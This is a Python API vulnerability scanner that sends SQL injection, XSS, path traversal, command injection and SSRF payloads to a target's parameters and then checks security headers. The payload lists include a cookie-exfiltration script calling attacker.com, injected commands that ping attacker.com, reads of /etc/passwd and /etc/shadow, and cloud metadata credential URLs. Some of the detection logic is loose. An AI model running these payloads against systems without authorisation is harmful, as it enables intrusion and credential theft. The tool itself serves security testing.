#!/usr/bin/env python3

import argparse
import re
import sys
import urllib.parse
import urllib.request
import urllib.error
import socket
import ssl
import json
import random
import string
from urllib.parse import urlparse
from http.client import HTTPResponse

# ANSI color codes for colored output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CRITICAL = '\033[41m\033[1m\033[97m'  # White text on red background
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Severity:
    INFORMATIONAL = f"{Colors.BLUE}[INFORMATIONAL]{Colors.ENDC}"
    LOW = f"{Colors.GREEN}[LOW]{Colors.ENDC}"
    MEDIUM = f"{Colors.YELLOW}[MEDIUM]{Colors.ENDC}"
    HIGH = f"{Colors.RED}[HIGH]{Colors.ENDC}"
    CRITICAL = f"{Colors.CRITICAL}[CRITICAL]{Colors.ENDC}"

def print_banner():
    banner = f"""
    {Colors.BLUE}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   {Colors.RED}██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗{Colors.BLUE}    ║
    ║   {Colors.RED}██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔════╝{Colors.BLUE}    ║
    ║   {Colors.RED}██║   ██║██║   ██║██║     ██╔██╗ ██║███████╗██║     {Colors.BLUE}    ║
    ║   {Colors.RED}╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║╚════██║██║     {Colors.BLUE}    ║
    ║   {Colors.RED} ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████║╚██████╗{Colors.BLUE}    ║
    ║   {Colors.RED}  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝{Colors.BLUE}    ║
    ║                                                           ║
    ║   {Colors.GREEN}API Vulnerability Scanner v3.0{Colors.BLUE}                       ║
    ║   {Colors.YELLOW}Advanced API Security Testing Suite{Colors.BLUE}                  ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    {Colors.ENDC}
    """
    print(banner)

def parse_burp_request(file_path):
    try:
        with open(file_path, 'r') as f:
            content = f.read()
        
        # Split headers and body
        parts = content.split('\n\n', 1)
        headers_part = parts[0]
        body = parts[1] if len(parts) > 1 else ''
        
        # Parse request line
        headers_lines = headers_part.split('\n')
        request_line = headers_lines[0].split(' ')
        method = request_line[0]
        path = request_line[1]
        protocol = request_line[2] if len(request_line) > 2 else 'HTTP/1.1'
        
        # Parse headers
        headers = {}
        for line in headers_lines[1:]:
            if ': ' in line:
                key, value = line.split(': ', 1)
                headers[key] = value.strip()
        
        # Construct full URL using Host header
        host = headers.get('Host', '').strip()
        if host:
            scheme = 'https' if ':443' in host else 'http'
            host = host.split(':')[0]  # Remove port if present
            full_url = f"{scheme}://{host}{path}"
        else:
            full_url = path
            
        return {
            'method': method,
            'path': path,
            'protocol': protocol,
            'headers': headers,
            'body': body,
            'full_url': full_url
        }
    except Exception as e:
        print(f"{Colors.RED}Error parsing Burp request file: {str(e)}{Colors.ENDC}")
        return None

def log_vulnerability(severity, vuln_type, message):
    severity_label = getattr(Severity, severity.upper(), Severity.INFORMATIONAL)
    print(f"{severity_label} {Colors.BOLD}[{vuln_type}]{Colors.ENDC} {message}")

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def test_api_endpoint(url, method, headers=None, body=None):
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(
            url,
            data=body.encode() if body else None,
            headers=headers or {},
            method=method
        )
        
        response = urllib.request.urlopen(req, context=context, timeout=10)
        return {
            'status': response.status,
            'headers': dict(response.headers),
            'content': response.read().decode('utf-8', errors='ignore')
        }
    except urllib.error.HTTPError as e:
        return {
            'status': e.code,
            'headers': dict(e.headers),
            'content': e.read().decode('utf-8', errors='ignore')
        }
    except Exception as e:
        return {
            'status': 0,
            'headers': {},
            'content': str(e)
        }

def active_scan_endpoint(url, method='GET', headers=None, body=None):
    vulnerabilities = []
    
    # Test for SQL Injection
    sqli_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
        "1) OR SLEEP(5)--",
        "' OR EXISTS(SELECT * FROM users)--",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1 limit 1 -- -+",
        "1' ORDER BY 1--+",
        "1' GROUP BY 1--+"
    ]
    
    # Test for XSS
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
        "\"autofocus/onfocus=alert(1)//",
        "><script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "<img src=x onerror=alert(document.cookie)>",
        "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
    ]
    
    # Test for LFI
    lfi_payloads = [
        "../../../etc/passwd",
        "../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../../../etc/passwd%00",
        "/etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/html/get.php?file=../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd%00",
        "/etc/passwd%00",
        "../../../etc/shadow",
        "../../boot.ini",
        "../../../../../../../../windows/win.ini"
    ]
    
    # Test for Command Injection
    cmdi_payloads = [
        "| whoami",
        "; whoami",
        "& whoami",
        "$(whoami)",
        "`whoami`",
        "|| whoami",
        "| id",
        "; id;",
        "&& id",
        "| cat /etc/passwd",
        "; ping -c 1 attacker.com;",
        "& nslookup attacker.com &",
        "| net user",
        "; netstat -an;"
    ]
    
    # Test for SSRF
    ssrf_payloads = [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://internal-service",
        "file:///etc/passwd",
        "dict://internal-service:11211/",
        "https://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
        "gopher://localhost:6379/_GET%20keys%20*",
        "http://localhost:22",
        "http://localhost:3306"
    ]

    print(f"\n{Colors.BOLD}Starting Advanced API Security Scan on: {url}{Colors.ENDC}\n")
    
    # Parse URL and parameters
    parsed_url = urllib.parse.urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = urllib.parse.parse_qs(parsed_url.query)
    
    # Function to test payloads
    def test_payload(payload, param_name=None):
        try:
            test_params = params.copy()
            if param_name:
                test_params[param_name] = [payload]
            
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{test_query}" if test_query else base_url
            
            response = test_api_endpoint(test_url, method, headers, body)
            if not response:
                return False
            
            content = response['content'].lower()
            status = response['status']
            
            # Vulnerability indicators
            indicators = {
                "SQL Injection": ["sql syntax", "mysql_fetch", "ora-", "sqlite3::", "postgresql error"],
                "XSS": [payload.lower()],
                "LFI": ["root:x:", "boot loader", "lp:x:", "nobody:x:", "[boot loader]"],
                "Command Injection": ["root:", "uid=", "gid=", "groups="],
                "SSRF": ["meta-data", "userdata:", "ami-id", "instance-id"],
                "Information Disclosure": ["stack trace", "error in your sql syntax", "warning:"],
                "Debug Information": ["debug", "trace:", "file:", "line:"],
                "API Error": ["internal server error", "stack trace:"]
            }
            
            # Check for indicators
            for indicator_type, indicator_list in indicators.items():
                if any(ind in content for ind in indicator_list):
                    return True
            
            # Check for suspicious status codes
            if status in [500, 503, 502]:
                return True
            
        except Exception as e:
            if "500" in str(e):
                return True
        return False

    # Test each parameter for vulnerabilities
    for param_name in params:
        # SQL Injection
        for payload in sqli_payloads:
            if test_payload(payload, param_name):
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'param': param_name,
                    'payload': payload,
                    'description': f'Possible SQL injection vulnerability in parameter: {param_name}'
                })
                break
        
        # XSS
        for payload in xss_payloads:
            if test_payload(payload, param_name):
                vulnerabilities.append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'HIGH',
                    'param': param_name,
                    'payload': payload,
                    'description': f'Possible XSS vulnerability in parameter: {param_name}'
                })
                break
        
        # LFI
        for payload in lfi_payloads:
            if test_payload(payload, param_name):
                vulnerabilities.append({
                    'type': 'Local File Inclusion',
                    'severity': 'CRITICAL',
                    'param': param_name,
                    'payload': payload,
                    'description': f'Possible Local File Inclusion vulnerability in parameter: {param_name}'
                })
                break
        
        # Command Injection
        for payload in cmdi_payloads:
            if test_payload(payload, param_name):
                vulnerabilities.append({
                    'type': 'Command Injection',
                    'severity': 'CRITICAL',
                    'param': param_name,
                    'payload': payload,
                    'description': f'Possible Command Injection vulnerability in parameter: {param_name}'
                })
                break
        
        # SSRF
        for payload in ssrf_payloads:
            if test_payload(payload, param_name):
                vulnerabilities.append({
                    'type': 'Server-Side Request Forgery',
                    'severity': 'HIGH',
                    'param': param_name,
                    'payload': payload,
                    'description': f'Possible SSRF vulnerability in parameter: {param_name}'
                })
                break

    # Check Security Headers
    try:
        response = test_api_endpoint(url, 'GET', headers)
        if response:
            headers = response['headers']
            
            # Check for missing security headers
            security_headers = {
                'Strict-Transport-Security': 'MEDIUM',
                'Content-Security-Policy': 'HIGH',
                'X-Frame-Options': 'MEDIUM',
                'X-Content-Type-Options': 'LOW',
                'X-XSS-Protection': 'LOW',
                'Referrer-Policy': 'INFORMATIONAL',
                'X-Permitted-Cross-Domain-Policies': 'MEDIUM',
                'Access-Control-Allow-Origin': 'HIGH'
            }
            
            for header, severity in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'severity': severity,
                        'header': header,
                        'description': f'Missing {header} security header'
                    })
            
            # Check for information disclosure
            if 'Server' in headers:
                vulnerabilities.append({
                    'type': 'Information Disclosure',
                    'severity': 'LOW',
                    'description': f'Server header reveals: {headers["Server"]}'
                })
            
            # Check CORS configuration
            if 'Access-Control-Allow-Origin' in headers:
                if headers['Access-Control-Allow-Origin'] == '*':
                    vulnerabilities.append({
                        'type': 'CORS Misconfiguration',
                        'severity': 'MEDIUM',
                        'description': 'CORS allows requests from any origin (*)'
                    })
        
    except Exception as e:
        print(f"{Colors.RED}Error checking security headers: {str(e)}{Colors.ENDC}")
    
    return vulnerabilities

def main():
    parser = argparse.ArgumentParser(description='Advanced API Vulnerability Scanner')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='Burp Suite request file to analyze')
    parser.add_argument('-a', '--active', action='store_true', help='Perform active scanning')
    parser.add_argument('-v', '--version', action='version', version='API Vulnerability Scanner v3.0')
    parser.add_argument('-m', '--method', default='GET', help='HTTP method (GET, POST, PUT, DELETE)')
    parser.add_argument('-H', '--headers', help='Custom headers in JSON format')
    parser.add_argument('-d', '--data', help='Request body data')
    
    args = parser.parse_args()
    
    print_banner()
    
    if not args.url and not args.file:
        url = input(f"{Colors.BLUE}[INPUT]{Colors.ENDC} Enter target URL to scan: ")
        args.url = url
    
    # Parse custom headers if provided
    custom_headers = {}
    if args.headers:
        try:
            custom_headers = json.loads(args.headers)
        except json.JSONDecodeError:
            print(f"{Colors.RED}Error: Invalid JSON format for headers{Colors.ENDC}")
            return
    
    if args.file:
        print(f"\n{Colors.BOLD}Analyzing Burp Suite request file: {args.file}{Colors.ENDC}")
        request_data = parse_burp_request(args.file)
        if request_data:
            print(f"\n{Colors.BLUE}[INFO]{Colors.ENDC} Target URL: {request_data['full_url']}")
            vulnerabilities = active_scan_endpoint(
                request_data['full_url'],
                method=request_data['method'],
                headers={**request_data['headers'], **custom_headers},
                body=args.data or request_data['body']
            )
    elif args.url:
        if args.active:
            vulnerabilities = active_scan_endpoint(
                args.url,
                method=args.method,
                headers=custom_headers,
                body=args.data
            )
        else:
            print(f"{Colors.YELLOW}No active scanning performed. Use -a flag for active scanning.{Colors.ENDC}")
            return
    else:
        print(f"{Colors.RED}Error: No URL or request file provided{Colors.ENDC}")
        return
    
    # Print results
    if vulnerabilities:
        print(f"\n{Colors.BOLD}Vulnerabilities Found:{Colors.ENDC}\n")
        
        # Group vulnerabilities by severity
        severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFORMATIONAL']
        grouped_vulns = {sev: [] for sev in severity_order}
        
        for vuln in vulnerabilities:
            grouped_vulns[vuln['severity']].append(vuln)
        
        # Print vulnerabilities by severity
        for severity in severity_order:
            vulns = grouped_vulns[severity]
            if vulns:
                print(f"\n{Colors.BOLD}{severity} Severity Vulnerabilities:{Colors.ENDC}")
                for vuln in vulns:
                    log_vulnerability(
                        vuln['severity'],
                        vuln['type'],
                        vuln.get('description', '') +
                        (f" (Parameter: {vuln['param']})" if 'param' in vuln else '') +
                        (f" (Payload: {vuln['payload']})" if 'payload' in vuln else '')
                    )
    else:
        print(f"\n{Colors.GREEN}No vulnerabilities detected!{Colors.ENDC}")

if __name__ == "__main__":
    main()
